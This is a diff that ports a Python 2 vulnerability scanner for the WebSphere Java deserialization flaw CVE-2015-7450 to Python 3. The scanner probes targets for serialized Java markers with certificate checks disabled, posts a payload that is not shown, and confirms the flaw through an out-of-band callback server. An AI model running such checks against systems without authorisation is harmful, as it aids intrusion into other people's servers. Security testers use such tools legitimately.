@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import ssl
 import socket
 import base64
@@ -38,15 +38,15 @@ def is_SOAP(ip, port, timeout):
 		ctx = ssl.create_default_context()
 		ctx.check_hostname = False
 		ctx.verify_mode = ssl.CERT_NONE
-		output = urllib2.urlopen('https://'+ip+":"+str(port), context=ctx, timeout=timeout).read()
+		output = urllib.request.urlopen('https://'+ip+":"+str(port), context=ctx, timeout=timeout).read()
 		if "rO0AB" in output:return (1, True)
-	except urllib2.HTTPError, e:
+	except urllib.error.HTTPError as e:
 		if ((e.getcode() == 500) and ("rO0AB" in e.read())):return (1, True)
 	except:pass
 	try:
-		output = urllib2.urlopen('http://'+ip+":"+str(port), timeout=timeout).read()
+		output = urllib.request.urlopen('http://'+ip+":"+str(port), timeout=timeout).read()
 		if "rO0AB" in output:return (0, True)
-	except urllib2.HTTPError, e:
+	except urllib.error.HTTPError as e:
 		if ((e.getcode() == 500) and ("rO0AB" in e.read())):return (0, True)
 	except:pass
 	return (2, False)
@@ -77,16 +77,16 @@ def check(ip, port, timeout):
 		ctx = ssl.create_default_context()
 		ctx.check_hostname = False
 		ctx.verify_mode = ssl.CERT_NONE
-		req = urllib2.Request(url = ('https://%s:%d/' % (ip, port)), data = post_data, headers=post_header)
-		try:request = urllib2.urlopen(req, context=ctx)
+		req = urllib.request.Request(url = ('https://%s:%d/' % (ip, port)), data = post_data, headers=post_header)
+		try:request = urllib.request.urlopen(req, context=ctx)
 		except:pass
 	elif((_is_soap[1] == True) and (_is_soap[0] == 0)):
-		req = urllib2.Request(url = ('http://%s:%d/' % (ip, port)), data = post_data, headers=post_header)
-		try:request = urllib2.urlopen(req)
+		req = urllib.request.Request(url = ('http://%s:%d/' % (ip, port)), data = post_data, headers=post_header)
+		try:request = urllib.request.urlopen(req)
 		except:pass
 	else:return
 	time.sleep(5)
-	req = urllib2.Request("http://%s:8088/check/%s" % (dnsserver, random_num))
-	reqopen = urllib2.urlopen(req)
-	if 'YES' in reqopen.read():return u"存在WebSphere反序列化漏洞(CVE-2015-7450)"
+	req = urllib.request.Request("http://%s:8088/check/%s" % (dnsserver, random_num))
+	reqopen = urllib.request.urlopen(req)
+	if 'YES' in reqopen.read():return "存在WebSphere反序列化漏洞(CVE-2015-7450)"
 	return
